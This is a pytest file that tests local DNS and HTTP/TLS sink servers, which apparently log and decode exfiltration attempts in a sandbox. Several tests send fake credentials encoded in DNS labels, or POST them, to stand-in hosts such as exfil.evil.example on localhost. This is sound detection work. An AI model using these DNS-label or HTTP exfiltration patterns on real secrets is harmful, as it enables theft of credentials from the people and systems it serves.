"""The sink programs run as real subprocesses here; Docker integration is separate."""

import base64
import contextlib
import http.client
import importlib.util
import json
import os
import socket
import ssl
import subprocess
import sys
import threading
import time
from pathlib import Path

import pytest

SINKS = Path(__file__).resolve().parents[2] / "run" / "sinks"
SINK_ANSWER = "192.0.2.9"
SINK_TIMEOUT = 10.0


def free_port(*, udp: bool) -> int:
    kind = socket.SOCK_DGRAM if udp else socket.SOCK_STREAM
    with socket.socket(socket.AF_INET, kind) as probe:
        probe.bind(("127.0.0.1", 0))
        return probe.getsockname()[1]


def wait_for_ready(log_path: Path, sink: str, process: subprocess.Popen) -> None:
    deadline = time.monotonic() + SINK_TIMEOUT
    while time.monotonic() < deadline:
        if log_path.exists():
            for line in log_path.read_text().splitlines():
                try:
                    record = json.loads(line)
                except json.JSONDecodeError:
                    continue
                if record.get("kind") == "ready" and record.get("sink") == sink:
                    return
        time.sleep(0.05)
    if process.poll() is None:
        pytest.fail(f"{sink} sink never wrote its ready record")
    stderr = (process.stderr.read() if process.stderr else b"").decode(errors="replace")
    pytest.fail(f"{sink} sink exited {process.returncode}: {stderr.strip()[:500]}")


def stop_sink(process: subprocess.Popen) -> None:
    process.terminate()
    try:
        process.wait(timeout=5)
    except subprocess.TimeoutExpired:
        process.kill()
        process.wait(timeout=5)


def read_records(log_path: Path, kind: str) -> list[dict]:
    records = []
    for line in log_path.read_text().splitlines():
        record = json.loads(line)
        if record.get("kind") == kind:
            records.append(record)
    return records


@pytest.fixture
def dns_sink(tmp_path: Path):
    log = tmp_path / "dns.jsonl"
    port = free_port(udp=True)
    process = subprocess.Popen(
        [
            sys.executable,
            str(SINKS / "dns_sink.py"),
            "--log",
            str(log),
            "--answer",
            SINK_ANSWER,
            "--bind",
            "127.0.0.1",
            "--port",
            str(port),
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    try:
        wait_for_ready(log, "dns", process)
        yield {"log": log, "port": port, "process": process}
    finally:
        stop_sink(process)


@pytest.fixture
def http_sink(tmp_path: Path):
    log = tmp_path / "http.jsonl"
    http_port = free_port(udp=False)
    tls_port = free_port(udp=False)
    process = subprocess.Popen(
        [
            sys.executable,
            str(SINKS / "http_sink.py"),
            "--log",
            str(log),
            "--bind",
            "127.0.0.1",
            "--http-port",
            str(http_port),
            "--tls-port",
            str(tls_port),
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    try:
        wait_for_ready(log, "http", process)
        yield {"log": log, "http_port": http_port, "tls_port": tls_port, "process": process}
    finally:
        stop_sink(process)


def dns_query(port: int, name: str, qtype: int = 1) -> bytes:
    packet = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    for label in name.split("."):
        packet += bytes([len(label)]) + label.encode()
    packet += b"\x00" + qtype.to_bytes(2, "big") + b"\x00\x01"
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(SINK_TIMEOUT)
        sock.sendto(packet, ("127.0.0.1", port))
        response, _ = sock.recvfrom(4096)
    return response


def recv_exact(sock: socket.socket, count: int) -> bytes:
    data = bytearray()
    while len(data) < count:
        chunk = sock.recv(count - len(data))
        if not chunk:
            raise AssertionError(f"connection closed after {len(data)} of {count} bytes")
        data.extend(chunk)
    return bytes(data)


def http_request(port: int, method: str, path: str, **kwargs) -> tuple[int, bytes]:
    connection = http.client.HTTPConnection("127.0.0.1", port, timeout=SINK_TIMEOUT)
    try:
        connection.request(method, path, **kwargs)
        response = connection.getresponse()
        return response.status, response.read()
    finally:
        connection.close()


def test_dns_answers_and_decodes_label_exfil(dns_sink):
    secret = "bw-fake-credential-0123456789"
    label = base64.b32encode(secret.encode()).decode().rstrip("=")
    qname = f"{label}.evil.example"
    response = dns_query(dns_sink["port"], qname)
    assert response[:2] == b"\x12\x34"
    assert int.from_bytes(response[2:4], "big") & 0x8000  # QR set
    assert int.from_bytes(response[6:8], "big") == 1
    assert response[-4:] == socket.inet_aton(SINK_ANSWER)
    hits = read_records(dns_sink["log"], "dns")
    hit = next(record for record in hits if record["qname"] == qname)
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["qtype"] == "A"
    assert any(
        entry["encoding"] == "base32" and entry["text"] == secret for entry in hit["decoded"]
    )

    hex_label = "73656e642d68656c70"
    dns_query(dns_sink["port"], f"{hex_label}.evil.example")
    hex_hit = next(
        record
        for record in read_records(dns_sink["log"], "dns")
        if record["qname"] == f"{hex_label}.evil.example"
    )
    assert any(
        entry["encoding"] == "hex" and entry["text"] == "send-help" for entry in hex_hit["decoded"]
    )


def test_dns_binary_label_does_not_decode_to_replacement_noise(dns_sink):
    label = base64.b64encode(b"\xff\xfe\xfd\xfc\xfb\xfa").decode().rstrip("=")
    dns_query(dns_sink["port"], f"{label}.evil.example")
    hit = read_records(dns_sink["log"], "dns")[-1]
    assert hit["qname"] == f"{label.replace(chr(47), chr(92) + '047')}.evil.example"
    assert hit["decoded"] == []


def test_dns_non_a_gets_noerror_without_answers(dns_sink):
    response = dns_query(dns_sink["port"], "plain.evil.example", qtype=28)
    assert int.from_bytes(response[6:8], "big") == 0
    hit = read_records(dns_sink["log"], "dns")[-1]
    assert hit["qname"] == "plain.evil.example"
    assert hit["qtype"] == "AAAA"
    assert hit["decoded"] == []


def test_dns_garbage_does_not_kill_the_sink(dns_sink):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(b"\xff" * 64, ("127.0.0.1", dns_sink["port"]))
        sock.sendto(b"\x12\x34", ("127.0.0.1", dns_sink["port"]))
        # A compression pointer must be refused, not parsed.
        sock.sendto(bytes.fromhex("123401000001000000000000c00c"), ("127.0.0.1", dns_sink["port"]))
    for payload in ((5).to_bytes(2, "big") + b"\x00" * 5, (4096).to_bytes(2, "big")):
        with socket.create_connection(("127.0.0.1", dns_sink["port"]), timeout=SINK_TIMEOUT) as tcp:
            tcp.sendall(payload)
    response = dns_query(dns_sink["port"], "alive.evil.example")
    assert response[-4:] == socket.inet_aton(SINK_ANSWER)
    assert any(
        record["qname"] == "alive.evil.example" for record in read_records(dns_sink["log"], "dns")
    )


def test_dns_over_tcp_query_is_answered_and_logged(dns_sink):
    name = "tcp-exfil.evil.example"
    payload = b"\x56\x78\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    payload += b"".join(bytes([len(part)]) + part.encode() for part in name.split("."))
    payload += b"\x00\x00\x01\x00\x01"
    with socket.create_connection(("127.0.0.1", dns_sink["port"]), timeout=SINK_TIMEOUT) as sock:
        sock.sendall(len(payload).to_bytes(2, "big") + payload)
        length = int.from_bytes(recv_exact(sock, 2), "big")
        response = recv_exact(sock, length)
    assert response[:2] == b"\x56\x78"
    assert int.from_bytes(response[2:4], "big") & 0x8000
    assert response[-4:] == socket.inet_aton(SINK_ANSWER)
    hit = next(record for record in read_records(dns_sink["log"], "dns") if record["qname"] == name)
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["qtype"] == "A"


def test_http_logs_method_path_headers_and_body(http_sink):
    body = "bw_secret=bw-fake-staging-key-0123456789"
    status, response_body = http_request(
        http_sink["http_port"],
        "POST",
        "/collect?stage=2",
        body=body,
        headers={"Host": "exfil.evil.example", "X-Token": "bw-test-token"},
    )
    assert status == 200
    assert response_body == b"ok"
    hit = read_records(http_sink["log"], "http")[-1]
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["method"] == "POST"
    assert hit["path"] == "/collect?stage=2"
    assert hit["host"] == "exfil.evil.example"
    assert hit["headers"]["x-token"] == "bw-test-token"
    assert hit["body"] == body
    assert hit["body_truncated"] is False


def test_tls_clienthello_sni_is_logged(http_sink):
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    with (
        pytest.raises((ssl.SSLError, OSError)),
        socket.create_connection(("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT) as raw,
    ):
        # The sink answers the handshake with a fatal alert, so it must fail.
        tls = context.wrap_socket(raw, server_hostname="exfil.evil.example")
        tls.close()
    hit = None
    deadline = time.monotonic() + SINK_TIMEOUT
    while time.monotonic() < deadline:
        hits = read_records(http_sink["log"], "tls")
        if hits:
            hit = hits[-1]
            break
        time.sleep(0.05)
    assert hit is not None, "the ClientHello was never logged"
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["sni"] == "exfil.evil.example"


def test_garbage_on_all_ports_does_not_kill_the_http_sink(http_sink):
    for port in (http_sink["http_port"], http_sink["tls_port"]):
        with socket.create_connection(("127.0.0.1", port), timeout=SINK_TIMEOUT) as sock:
            sock.sendall(b"\x00\x01\x02 not-a-request\r\n\r\n")
    status, _ = http_request(http_sink["http_port"], "GET", "/after-garbage")
    assert status == 200
    # Garbage contacts are logged by their own worker threads, so order is not guaranteed.
    assert any(r["path"] == "/after-garbage" for r in read_records(http_sink["log"], "http"))


def test_unparseable_tcp_contact_on_the_http_port_is_a_hit(http_sink):
    with socket.create_connection(
        ("127.0.0.1", http_sink["http_port"]), timeout=SINK_TIMEOUT
    ) as sock:
        sock.sendall(b"\x00\x01\x02 binary-not-http")
        sock.shutdown(socket.SHUT_WR)
    deadline = time.monotonic() + SINK_TIMEOUT
    hits = []
    while time.monotonic() < deadline:
        hits = [
            record for record in read_records(http_sink["log"], "http") if record["method"] == ""
        ]
        if hits:
            break
        time.sleep(0.05)
    assert hits, "unparseable TCP contact was never logged"
    hit = hits[-1]
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["raw"].startswith("\\x00\\x01\\x02 binary-not-http")
    assert hit["path"] == "" and hit["host"] == "" and hit["body"] == ""


def test_connection_limit_refusals_are_recorded(http_sink):
    held = [
        socket.create_connection(("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT)
        for _ in range(16)
    ]
    try:
        time.sleep(0.3)
        for _ in range(3):
            with socket.create_connection(
                ("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT
            ):
                pass
        deadline = time.monotonic() + SINK_TIMEOUT
        refusals = []
        while time.monotonic() < deadline:
            refusals = read_records(http_sink["log"], "refused")
            if refusals:
                break
            time.sleep(0.05)
        assert refusals, "a refused contact left no record"
        assert refusals[0]["source_ip"] == "127.0.0.1"
    finally:
        for sock in held:
            sock.close()


def test_oversize_body_is_truncated(http_sink):
    body = "x" * (64 * 1024 + 4096)
    status, _ = http_request(http_sink["http_port"], "PUT", "/flood", body=body)
    assert status == 200
    hit = read_records(http_sink["log"], "http")[-1]
    assert len(hit["body"]) == 64 * 1024
    assert hit["body_truncated"] is True


def test_log_stops_at_the_cap_but_serving_continues(http_sink):
    for _ in range(90):
        status, _ = http_request(http_sink["http_port"], "POST", "/bulk", body="y" * 64 * 1024)
        assert status == 200
    text = http_sink["log"].read_text()
    assert '"kind":"log_truncated"' in text
    http_request(http_sink["http_port"], "GET", "/post-truncation")
    assert http_sink["log"].read_text() == text  # nothing new was logged after the marker
    status, _ = http_request(http_sink["http_port"], "GET", "/still-alive")
    assert status == 200


def build_dns_query(query_id: bytes, name: str, qtype: int = 1) -> bytes:
    query = query_id + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    for part in name.split("."):
        query += bytes([len(part)]) + part.encode()
    return query + b"\x00" + qtype.to_bytes(2, "big") + b"\x00\x01"


def test_dns_response_echoes_the_full_question_and_an_answer_rr(dns_sink):
    query = build_dns_query(b"\xbe\xef", "full.evil.example")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(SINK_TIMEOUT)
        sock.sendto(query, ("127.0.0.1", dns_sink["port"]))
        response, _ = sock.recvfrom(4096)
    assert response[:2] == b"\xbe\xef"
    assert response[2:4] == b"\x81\x80"  # QR, RD, RA, NOERROR
    assert response[4:6] == b"\x00\x01"  # QDCOUNT
    assert response[6:8] == b"\x00\x01"  # ANCOUNT
    assert response[8:12] == b"\x00\x00\x00\x00"
    question = query[12:]
    assert question.endswith(b"\x00\x01\x00\x01")  # QTYPE A, QCLASS IN
    assert response[12 : 12 + len(question)] == question
    answer = response[12 + len(question) :]
    assert answer == (
        b"\xc0\x0c"
        + b"\x00\x01"  # type A
        + b"\x00\x01"  # class IN
        + (30).to_bytes(4, "big")  # the sink's answer TTL
        + b"\x00\x04"
        + socket.inet_aton(SINK_ANSWER)
    )


def test_dns_sink_stop_is_acknowledged(dns_sink):
    process = dns_sink["process"]
    process.terminate()
    assert process.wait(timeout=SINK_TIMEOUT) == 0
    record = json.loads(dns_sink["log"].read_text().splitlines()[-1])
    assert (record["kind"], record["sink"]) == ("stopped", "dns")


def test_http_sink_stop_is_acknowledged(http_sink):
    process = http_sink["process"]
    process.terminate()
    assert process.wait(timeout=SINK_TIMEOUT) == 0
    record = json.loads(http_sink["log"].read_text().splitlines()[-1])
    assert (record["kind"], record["sink"]) == ("stopped", "http")


def test_http_contact_that_stalls_mid_head_is_still_logged(http_sink):
    raw = b"GET /stalled HTTP/1.1\r\nHost: stall.evil.example"
    with socket.create_connection(
        ("127.0.0.1", http_sink["http_port"]), timeout=SINK_TIMEOUT
    ) as sock:
        sock.sendall(raw)
        deadline = time.monotonic() + SINK_TIMEOUT
        hits = []
        while time.monotonic() < deadline and not hits:
            hits = [
                record
                for record in read_records(http_sink["log"], "http")
                if "/stalled" in record.get("raw", "")
            ]
            time.sleep(0.1)
    assert hits, "a stalled partial request was never logged"
    assert hits[-1]["method"] == "" and hits[-1]["path"] == ""
    assert hits[-1]["raw"].startswith("GET /stalled HTTP/1.1")
    # Everything the peer sent was captured, so the head is not flagged incomplete.
    assert hits[-1]["headers_truncated"] is False


def test_tls_contact_that_stalls_mid_clienthello_is_still_logged(http_sink):
    partial = b"\x16\x03\x01\x00\x20\x01"  # promises 32 handshake bytes, sends 1
    with socket.create_connection(
        ("127.0.0.1", http_sink["tls_port"]), timeout=SINK_TIMEOUT
    ) as sock:
        sock.sendall(partial)
        deadline = time.monotonic() + SINK_TIMEOUT
        hits = []
        while time.monotonic() < deadline and not hits:
            hits = read_records(http_sink["log"], "tls")
            time.sleep(0.1)
    assert hits, "a stalled partial ClientHello was never logged"
    assert hits[-1]["sni"] is None


def test_body_shorter_than_content_length_is_marked_truncated(http_sink):
    with socket.create_connection(
        ("127.0.0.1", http_sink["http_port"]), timeout=SINK_TIMEOUT
    ) as sock:
        sock.sendall(
            b"POST /early HTTP/1.1\r\nHost: early.evil.example\r\nContent-Length: 100\r\n\r\nhello"
        )
        sock.shutdown(socket.SHUT_WR)
        while sock.recv(4096):
            pass
    hit = next(
        record for record in read_records(http_sink["log"], "http") if record["path"] == "/early"
    )
    assert hit["body"] == "hello"
    assert hit["body_truncated"] is True


def load_sink_module(script: str):
    spec = importlib.util.spec_from_file_location(script.removesuffix(".py"), SINKS / script)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.mark.parametrize("script", ["dns_sink.py", "http_sink.py"])
def test_log_writer_serializes_concurrent_writers_and_keeps_the_marker_last(
    tmp_path: Path, monkeypatch, script
):
    module = load_sink_module(script)
    monkeypatch.setattr(module, "LOG_CAP_BYTES", 20_000)
    kind = "dns" if script == "dns_sink.py" else "http"
    barrier = threading.Barrier(8, timeout=SINK_TIMEOUT)
    path = tmp_path / "sink.jsonl"

    with open(path, "w", encoding="utf-8") as file:
        log = module.JsonlLog(file)

        def worker(index):
            barrier.wait()
            for number in range(100):
                log.write({"kind": kind, "ts": float(number), "worker": index, "pad": "x" * 200})

        threads = [threading.Thread(target=worker, args=(index,)) for index in range(8)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join(SINK_TIMEOUT)

    records = [json.loads(line) for line in path.read_text().splitlines()]
    assert records[-1]["kind"] == "log_truncated"
    assert sum(record["kind"] == "log_truncated" for record in records) == 1
    assert all(record["kind"] in {kind, "log_truncated"} for record in records)


@pytest.mark.parametrize("script", ["dns_sink.py", "http_sink.py"])
def test_log_write_failure_kills_the_sink(tmp_path: Path, script):
    fifo = tmp_path / "sink.fifo"
    os.mkfifo(fifo)
    ready: list[str] = []

    def take_ready_line():
        with open(fifo, encoding="utf-8") as pipe:
            ready.append(pipe.readline())

    reader = threading.Thread(target=take_ready_line, daemon=True)
    reader.start()
    dns_port, http_port, tls_port = free_port(udp=True), free_port(udp=False), free_port(udp=False)
    command = [sys.executable, str(SINKS / script), "--log", str(fifo), "--bind", "127.0.0.1"]
    if script == "dns_sink.py":
        command += ["--answer", SINK_ANSWER, "--port", str(dns_port)]
    else:
        command += ["--http-port", str(http_port), "--tls-port", str(tls_port)]
    process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        deadline = time.monotonic() + SINK_TIMEOUT
        while not ready and time.monotonic() < deadline:
            time.sleep(0.01)
        assert ready and json.loads(ready[0])["kind"] == "ready"
        reader.join(timeout=SINK_TIMEOUT)  # the reader is gone; the next write must fail
        assert not reader.is_alive()
        if script == "dns_sink.py":
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(
                    build_dns_query(b"\x01\x02", "logfail.evil.example"),
                    ("127.0.0.1", dns_port),
                )
        else:
            with pytest.raises((OSError, http.client.HTTPException)):
                http_request(http_port, "GET", "/logfail")
        assert process.wait(timeout=SINK_TIMEOUT) != 0
    finally:
        if process.poll() is None:
            process.kill()
            process.wait(timeout=SINK_TIMEOUT)
        reader.join(timeout=SINK_TIMEOUT)


class SegmentedConn:
    """recv() returns at most one queued segment per call, like a paused sender."""

    def __init__(self, segments: list[bytes]):
        self._segments = [bytearray(segment) for segment in segments]
        self.consumed = 0
        self.sent: list[bytes] = []

    def recv(self, size: int) -> bytes:
        while self._segments and not self._segments[0]:
            self._segments.pop(0)
        if not self._segments:
            return b""
        chunk = bytes(self._segments[0][:size])
        del self._segments[0][: len(chunk)]
        self.consumed += len(chunk)
        return chunk

    def sendall(self, payload: bytes) -> None:
        self.sent.append(payload)


def padded_head(target: int) -> bytes:
    lines = [
        b"POST /big HTTP/1.1",
        b"Host: big.evil.example",
        b"X-Pad: ",
        b"Content-Length: 5000",
    ]
    pad = target - len(b"\r\n".join(lines) + b"\r\n\r\n")
    assert pad >= 0
    lines[2] = b"X-Pad: " + b"x" * pad
    head = b"\r\n".join(lines) + b"\r\n\r\n"
    assert len(head) == target
    return head


def test_sink_stop_tolerates_a_tracked_but_unstarted_worker():
    module = load_sink_module("http_sink.py")
    sink = module.Sink(None)
    sink._threads.add(threading.Thread(target=lambda: None))
    assert sink.stop() is True


def test_read_head_applies_the_limit_to_the_head_not_coalesced_body_bytes():
    module = load_sink_module("http_sink.py")
    full = padded_head(32_000)
    body = b"B" * 5000
    conn = SegmentedConn([full[:31_000], full[31_000:] + body])
    head, raw, truncated = module.read_head(conn)
    assert raw is None
    assert head is not None
    assert truncated is False
    assert len(head[0]) + len(head[1]) == 32_000
    assert head[0].startswith(b"POST /big HTTP/1.1\r\nHost: big.evil.example\r\n")
    assert head[2] == body[: len(head[2])]
    assert len(head[2]) == 4096 - (32_000 - 31_000)


def test_read_head_stays_bounded_when_the_head_exceeds_the_limit():
    module = load_sink_module("http_sink.py")
    full = padded_head(module.HEAD_LIMIT + 1000)
    conn = SegmentedConn([full + b"B" * 5000])
    head, raw, truncated = module.read_head(conn)
    assert head is None
    assert raw is not None
    assert truncated is True
    assert len(raw) <= module.HEAD_LIMIT + 4096
    assert conn.consumed <= module.HEAD_LIMIT + 4096


def test_read_head_reports_a_stalled_head_as_not_truncated():
    module = load_sink_module("http_sink.py")
    conn = SegmentedConn([b"GET /stalled HTTP/1.1\r\nHost: x"])  # peer stops mid-head
    head, raw, truncated = module.read_head(conn)
    assert head is None and raw is not None and truncated is False


def test_http_head_past_the_limit_sets_an_incomplete_flag(http_sink):
    module = load_sink_module("http_sink.py")
    raw_http_exchange(
        http_sink["http_port"],
        b"POST /jumbo HTTP/1.1\r\nHost: jumbo.evil.example\r\nX-Pad: "
        + b"x" * (module.HEAD_LIMIT + 4096)
        + b"\r\n\r\n",
    )
    hit = next(record for record in read_records(http_sink["log"], "http") if record["path"] == "")
    assert hit["method"] == ""
    assert hit["headers_truncated"] is True
    assert hit["body_truncated"] is False
    assert hit["raw"].startswith("POST /jumbo")


def test_decode_label_recovers_lower_and_mixed_case_base32():
    module = load_sink_module("dns_sink.py")
    secret = "AKIA-FAKE-SECRET"
    upper = base64.b32encode(secret.encode()).decode().rstrip("=")
    mixed = "".join(ch.lower() if index % 2 else ch for index, ch in enumerate(upper))
    # DNS names are case-insensitive and resolvers may randomize case (0x20).
    for label in (upper, upper.lower(), mixed):
        entries = module.decode_label(label)
        assert any(
            entry["encoding"] == "base32" and entry["text"] == secret for entry in entries
        ), label


def test_decode_label_hex_accepts_any_case():
    module = load_sink_module("dns_sink.py")
    secret = "send-help"
    upper = secret.encode().hex().upper()
    mixed = "".join(ch.lower() if index % 2 else ch for index, ch in enumerate(upper))
    for label in (upper, upper.lower(), mixed):
        entries = module.decode_label(label)
        assert any(entry["encoding"] == "hex" and entry["text"] == secret for entry in entries), (
            label
        )


def test_decode_label_base64_stays_case_sensitive():
    module = load_sink_module("dns_sink.py")
    secret = "bw-fake-credential-0123456789"
    label = base64.b64encode(secret.encode()).decode().rstrip("=")
    assert any(entry["text"] == secret for entry in module.decode_label(label))
    # A 0x20-style case flip must not make base64 decode to the same secret.
    assert all(entry["text"] != secret for entry in module.decode_label(label.lower()))


def test_dns_decodes_lowercase_base32_label(dns_sink):
    secret = "AKIA-FAKE-SECRET"
    label = base64.b32encode(secret.encode()).decode().rstrip("=").lower()
    qname = f"{label}.evil.example"
    dns_query(dns_sink["port"], qname)
    hit = next(
        record for record in read_records(dns_sink["log"], "dns") if record["qname"] == qname
    )
    assert any(
        entry["encoding"] == "base32" and entry["text"] == secret for entry in hit["decoded"]
    )


def raw_http_exchange(port: int, payload: bytes) -> None:
    with socket.create_connection(("127.0.0.1", port), timeout=SINK_TIMEOUT) as sock:
        sock.sendall(payload)
        # A head past the capture limit leaves unread bytes, so the sink's close
        # resets the connection; the probe only needs the bytes delivered.
        with contextlib.suppress(OSError):
            while sock.recv(4096):
                pass


def test_raw_preview_limits_raw_bytes_before_escaping():
    module = load_sink_module("http_sink.py")
    assert module.raw_preview(b"\xff" * 60) == "\\xff" * 60
    preview = module.raw_preview(b"\xff" * 300)
    assert preview == "\\xff" * module.RAW_LIMIT
    assert len(preview) <= 4 * module.RAW_LIMIT
    assert module.raw_preview(b"A" * 250) == "A" * module.RAW_LIMIT


def test_http_excess_headers_are_marked_truncated(http_sink):
    headers = b"".join(b"X-H%d: v\r\n" % index for index in range(120))
    raw_http_exchange(
        http_sink["http_port"],
        b"GET /many HTTP/1.1\r\nHost: many.evil.example\r\n" + headers + b"\r\n",
    )
    hit = next(
        record for record in read_records(http_sink["log"], "http") if record["path"] == "/many"
    )
    assert len(hit["headers"]) == 100
    assert hit["headers_truncated"] is True


def test_http_long_header_value_is_marked_truncated(http_sink):
    raw_http_exchange(
        http_sink["http_port"],
        b"GET /long HTTP/1.1\r\nHost: long.evil.example\r\nX-Long: " + b"x" * 5000 + b"\r\n\r\n",
    )
    hit = next(
        record for record in read_records(http_sink["log"], "http") if record["path"] == "/long"
    )
    assert len(hit["headers"]["x-long"]) == 4096
    assert hit["headers_truncated"] is True


def test_http_complete_headers_are_not_marked_truncated(http_sink):
    status, _ = http_request(http_sink["http_port"], "GET", "/complete")
    assert status == 200
    hit = next(
        record for record in read_records(http_sink["log"], "http") if record["path"] == "/complete"
    )
    assert hit["headers_truncated"] is False


def test_http_extra_request_line_token_is_preserved(http_sink):
    raw_http_exchange(
        http_sink["http_port"],
        b"GET /path EXTRATOKEN HTTP/1.1\r\nHost: extra.evil.example\r\n\r\n",
    )
    hit = next(
        record for record in read_records(http_sink["log"], "http") if record["path"] == "/path"
    )
    assert hit["method"] == "GET"
    assert "EXTRATOKEN" in hit["raw"]


def wait_for_unparsed_dns(log_path: Path) -> list[dict]:
    deadline = time.monotonic() + SINK_TIMEOUT
    hits = []
    while time.monotonic() < deadline:
        hits = [
            record for record in read_records(log_path, "dns") if record["qname"] == "<unparsed>"
        ]
        if hits:
            break
        time.sleep(0.05)
    return hits


def test_dns_over_tcp_query_larger_than_the_udp_limit_is_answered_and_logged(dns_sink):
    base = build_dns_query(b"\x5a\xa5", "big.evil.example")
    payload = base + b"\x00" * (65535 - len(base))
    assert len(payload) == 65535
    with socket.create_connection(("127.0.0.1", dns_sink["port"]), timeout=SINK_TIMEOUT) as sock:
        sock.sendall(len(payload).to_bytes(2, "big") + payload)
        length = int.from_bytes(recv_exact(sock, 2), "big")
        response = recv_exact(sock, length)
    assert response[:2] == b"\x5a\xa5"
    assert response[-4:] == socket.inet_aton(SINK_ANSWER)
    hit = next(
        record
        for record in read_records(dns_sink["log"], "dns")
        if record["qname"] == "big.evil.example"
    )
    assert hit["source_ip"] == "127.0.0.1"
    assert hit["qtype"] == "A"


def test_dns_over_tcp_unparseable_message_is_logged_as_unparsed(dns_sink):
    packet = b"\xff" * 32
    with socket.create_connection(("127.0.0.1", dns_sink["port"]), timeout=SINK_TIMEOUT) as sock:
        sock.sendall(len(packet).to_bytes(2, "big") + packet)
    hits = wait_for_unparsed_dns(dns_sink["log"])
    assert hits, "an unparseable TCP DNS message was never logged"
    assert hits[-1]["source_ip"] == "127.0.0.1"
    assert hits[-1]["qtype"] == "unknown"
    assert hits[-1]["raw"].startswith("\\xff")


def test_dns_over_tcp_truncated_message_is_logged_as_unparsed(dns_sink):
    with socket.create_connection(("127.0.0.1", dns_sink["port"]), timeout=SINK_TIMEOUT) as sock:
        sock.sendall((100).to_bytes(2, "big") + b"truncated-payload")
        sock.shutdown(socket.SHUT_WR)
    hits = wait_for_unparsed_dns(dns_sink["log"])
    assert hits, "a truncated TCP DNS message was never logged"
    assert hits[-1]["source_ip"] == "127.0.0.1"
    assert hits[-1]["raw"].startswith("truncated-payload")


def test_dns_stop_tcp_shuts_down_a_connection_accepted_as_the_listener_closes(monkeypatch):
    module = load_sink_module("dns_sink.py")
    monkeypatch.setattr(module, "SHUTDOWN_SECONDS", 0.3)

    class FakeLog:
        def __init__(self):
            self.records = []

        def write(self, record):
            self.records.append(record)

    class FakeConn:
        def __init__(self):
            self.entered_recv = threading.Event()
            self.released = threading.Event()
            self.shutdown_calls = 0
            self.closed = False

        def settimeout(self, timeout):
            pass

        def recv(self, size):
            self.entered_recv.set()
            self.released.wait(timeout=SINK_TIMEOUT)
            return b""

        def shutdown(self, how):
            self.shutdown_calls += 1
            self.released.set()

        def close(self):
            self.closed = True
            self.released.set()

    class FakeListener:
        def __init__(self, conn):
            self.conn = conn
            self.accept_released = threading.Event()
            self.closed = False

        def accept(self):
            self.accept_released.wait(timeout=SINK_TIMEOUT)
            return self.conn, ("127.0.0.1", 40000)

        def close(self):
            self.closed = True
            self.accept_released.set()
            # The connection is accepted and stalls in recv before shutdown proceeds.
            assert self.conn.entered_recv.wait(timeout=SINK_TIMEOUT)

    log = FakeLog()
    conn = FakeConn()
    listener = FakeListener(conn)
    stopping = threading.Event()
    active: set = set()
    active_lock = threading.Lock()
    thread = threading.Thread(
        target=module.serve_tcp,
        args=(log, listener, socket.inet_aton(SINK_ANSWER), stopping, active, active_lock),
        daemon=True,
    )
    thread.start()

    assert module.stop_tcp(listener, thread, stopping, active, active_lock) is True
    assert not thread.is_alive()
    assert listener.closed
    assert conn.shutdown_calls == 1
    assert any(record["qname"] == "<unparsed>" for record in log.records)


def test_dns_stop_tcp_tolerates_an_unstarted_accept_thread():
    module = load_sink_module("dns_sink.py")

    class FakeListener:
        def __init__(self):
            self.closed = False

        def close(self):
            self.closed = True

    listener = FakeListener()
    stopping = threading.Event()
    thread = threading.Thread(target=lambda: None)

    assert module.stop_tcp(listener, thread, stopping, set(), threading.Lock()) is True
    assert stopping.is_set()
    assert listener.closed


def test_dns_udp_question_truncated_before_qclass_is_logged_as_unparsed(dns_sink):
    packet = build_dns_query(b"\x31\x32", "truncated-secret.evil.example")[:-2]
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(packet, ("127.0.0.1", dns_sink["port"]))
    dns_query(dns_sink["port"], "after-truncated.evil.example")
    hits = read_records(dns_sink["log"], "dns")
    assert [hit["qname"] for hit in hits] == ["<unparsed>", "after-truncated.evil.example"]
    assert hits[0]["source_ip"] == "127.0.0.1"
    assert hits[0]["qtype"] == "unknown"
    assert "truncated-secret" in hits[0]["raw"]


def test_dns_udp_datagram_larger_than_the_receive_buffer_flags_incomplete(dns_sink):
    module = load_sink_module("dns_sink.py")
    query = build_dns_query(b"\x77\x88", "jumbo.evil.example")
    packet = query + b"\x00" * (module.PACKET_LIMIT + 512)
    assert len(packet) > module.PACKET_LIMIT
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(SINK_TIMEOUT)
        sock.sendto(packet, ("127.0.0.1", dns_sink["port"]))
        response, _ = sock.recvfrom(4096)
    assert response[:2] == b"\x77\x88"  # the captured prefix still gets its answer
    hit = next(
        record
        for record in read_records(dns_sink["log"], "dns")
        if record["qname"] == "jumbo.evil.example"
    )
    assert hit["qtype"] == "A"
    assert hit["capture_incomplete"] is True


def test_dns_udp_truncated_garbage_datagram_flags_incomplete(dns_sink):
    module = load_sink_module("dns_sink.py")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(b"\x99" * (module.PACKET_LIMIT + 64), ("127.0.0.1", dns_sink["port"]))
    hits = wait_for_unparsed_dns(dns_sink["log"])
    assert hits, "a truncated garbage datagram was never logged"
    assert hits[-1]["capture_incomplete"] is True
